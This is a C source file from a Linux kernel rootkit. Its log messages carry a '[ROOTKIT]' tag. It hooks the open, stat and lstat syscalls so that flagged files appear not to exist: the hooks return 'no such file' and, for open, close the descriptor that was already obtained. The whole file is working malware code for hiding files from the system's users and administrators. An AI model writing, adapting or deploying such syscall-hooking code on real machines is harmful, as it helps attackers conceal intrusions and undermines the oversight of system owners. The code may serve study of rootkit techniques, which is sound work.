#include "files.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include "utils.h"
#include <linux/err.h>
#include <linux/fdtable.h>
#include <linux/limits.h>
#include <linux/namei.h>
#include <linux/printk.h>
#include <linux/stat.h>
#include <linux/string.h>
#include <linux/types.h>

static long do_statx(const sysfun_t orig_func, struct pt_regs *const p_regs, const int i32_dfd,
                     const char __user *const s_filename, const int i32_flags)
{
    long l_ret               = 0;    // Return value of the real syscall
    const char *s_filename_k = NULL; // Name of the file

    s_filename_k = strndup_user(s_filename, PATH_MAX);

    IF_U (IS_ERR_OR_NULL(s_filename_k)) {
        pr_err("[ROOTKIT] * Could not copy filename from user\n");
        s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
    }

    pr_info("[ROOTKIT] * File name: %s\n", s_filename_k);

    kfree_const(s_filename_k);

    IF_U (is_pathname_hidden(i32_dfd, s_filename, i32_flags)) {
        pr_info("[ROOTKIT]   * Hiding file\n");

        return -ENOENT; // No such file or directory
    }

    l_ret = orig_func(p_regs);
    pr_info("[ROOTKIT] * Return value: %ld\n", l_ret);

    return l_ret;
}

// sys_open syscall hook handler
SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                      umode_t, ui16_mode)
{
    long l_ret               = 0;    // Return value of the real syscall
    const char *s_filename_k = NULL; // Name of the file
    const file_t *p_file     = NULL; // File structure representing what was opened

    l_ret = orig_open(p_regs);

    s_filename_k = strndup_user(s_filename, PATH_MAX);

    IF_U (IS_ERR_OR_NULL(s_filename_k)) {
        pr_err("[ROOTKIT] * Could not copy filename from user\n");
        s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
    }

    pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho) = %ld\n", s_filename_k, i32_flags, ui16_mode, l_ret);

    kfree_const(s_filename_k);

    // Check if the opened file is supposed to be hidden
    p_file = fd_get_file(l_ret);

    IF_U (IS_ERR_OR_NULL(p_file)) {
        pr_err("[ROOTKIT] * Could not get file structure\n");
    }
    else {
        IF_U (is_file_hidden(p_file)) {
            pr_info("[ROOTKIT]   * Hiding file\n");

            // Close the file descriptor
            close_fd(l_ret);

            return -ENOENT; // No such file or directory
        }
    }

    return l_ret;
}

// sys_stat syscall hook handler
SYSCALL_HOOK_HANDLER2(stat, orig_stat, p_regs, const char __user *, s_filename,
                      struct stat __user *, p_statbuf)
{
    pr_info("[ROOTKIT] stat(%p, %p)\n", s_filename, p_statbuf);

    return do_statx(orig_stat, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_lstat syscall hook handler
SYSCALL_HOOK_HANDLER2(lstat, orig_lstat, p_regs, const char __user *, s_filename,
                      struct stat __user *, p_statbuf)
{
    pr_info("[ROOTKIT] lstat(%p, %p)\n", s_filename, p_statbuf);

    return do_statx(orig_lstat, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
}
